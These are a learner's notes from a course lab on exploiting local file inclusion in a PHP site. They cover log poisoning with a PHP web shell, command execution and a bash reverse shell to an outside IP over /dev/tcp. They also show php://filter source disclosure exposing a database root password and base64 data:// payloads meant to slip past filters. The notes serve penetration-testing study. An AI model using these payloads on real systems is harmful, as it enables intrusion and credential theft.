 **we can use directory traversal vulnerabilities to obtain the contents of a file outside of the web server's web root.Â _File inclusion_Â vulnerabilities allow us to "include" a file in the application's running code. The exploitation of directory traversal and LFI vulnerabilities mainly differs when handling executable files or content.**

---

goal is to obtainÂ _Remote Code Execution_Â (RCE) via an LFI vulnerability can do this by Log Poisoning, works by modifying data we send to a web application so that the logs contain executable code

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```

This above shows us what user-agent accessed file last, so we can go ahead and modify our user-agent header to something executable so that it will be stored and then we can exploit by running it.

can now modify the User Agent to include the PHP code snippet, using burp send to page page=admin.php:

```
<?php echo system($_GET['cmd']); ?>
```

now to execute a command, send req here like so
```
../../../../../../../../../var/log/apache2/access.log&cmd=ps
```

we can use an ampersand (&) as a delimiter. We'll also remove the User Agent line from the current Burp request to avoid poisoning the log again, which would lead to multiple executions of our command due to two PHP snippets included in the log.

![[Pasted image 20250316201548.png]]

Now if we try cmd= ls -la

The output in theÂ _Response_Â section shows that our input triggers an error. This happens due to the space between the command and the parameters, so lets use url encoding for the (%20) 
![[Pasted image 20250316201900.png]]

We have achieved command execution on the target system and can leverage this to get a reverse shell or add our SSH key to theÂ **authorized_keys**Â file for a user

```
bash -c "bash -i >& /dev/tcp/192.168.45.230/4444 0>&1"
```
We'll once again encode the special characters with URL encoding.

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.230%2F4444%200%3E%261%22
```

before we run, need to start netcat listener on port 4444
```
nc -nvlp 4444
```


---

The PHP code snippet we used in this section for Linux also works on Windows

When we use Log Poisoning on Windows, we should understand that the log files are located in application-specific paths. For example, on a target runningÂ _XAMPP_,[10](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/file-inclusion-vulnerabilities-44691/local-file-inclusion-lfi-44645#fn-local_id_574-10)Â the Apache logs can be found inÂ **C:\xampp\apache\logs\**

Outside PHP, we can also leverage LFI and RFI vulnerabilities in other frameworks or server-side scripting languages includingÂ _Perl_,[11](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/file-inclusion-vulnerabilities-44691/local-file-inclusion-lfi-44645#fn-local_id_574-11)Â _Active Server Pages Extended_,[12](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/file-inclusion-vulnerabilities-44691/local-file-inclusion-lfi-44645#fn-local_id_574-12)Â _Active Server Pages_,[13](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/file-inclusion-vulnerabilities-44691/local-file-inclusion-lfi-44645#fn-local_id_574-13)Â andÂ _Java Server Pages_.[14](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/file-inclusion-vulnerabilities-44691/local-file-inclusion-lfi-44645#fn-local_id_574-14)Â Exploiting these kinds of vulnerabilities is very similar across these languages.

If we can write JSP code to a file using Log Poisoning and include this file with the LFI vulnerability, the code will be executed. The only difference between this example and the previous PHP demonstration is that the code snippet used for the Log Poisoning would be in a different language.

---

For the windows machine it was a little bit different and not sure if i was supposed to do it this way but i was not able to get cmds going in the url so i noticed in the logs if i ran 
```
curl -A "<?php system('whoami'); ?>" "http://192.168.170.193/meteor/index.php?page=admin.php" 
```

i was getting **NT AUTHORITY\SYSTEM** -which is root

then i ran dir saw a sus file and then ran 
```
curl -A "<?php system('type hopefullynobodyfindsthisfilebecauseitssupersecret.txt'); ?>" "http://192.168.170.193/meteor/index.php?page=admin.php"
```
.... gave me the flag but there was no reverse shell :D

 examine theÂ **php://filter**[1](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/file-inclusion-vulnerabilities-44691/local-file-inclusion-lfi-44645#fn-local_id_59-1)Â andÂ **data:// ....:
can also encode with base64 or ROT13 

```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

or

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

output:
```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...

also can do dir traversals for resource like so:
curl 192.168.242.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../var/www/html/backup.php

```

we then decode this and find:
```
kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php
$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);
...
```

username and pass right there ðŸ‘€

```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

using data tag we can try to execute php code if poisoning doesnt work.

When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. can try to use theÂ **data://**Â wrapper with base64-encoded data.

```
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==


kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
...
```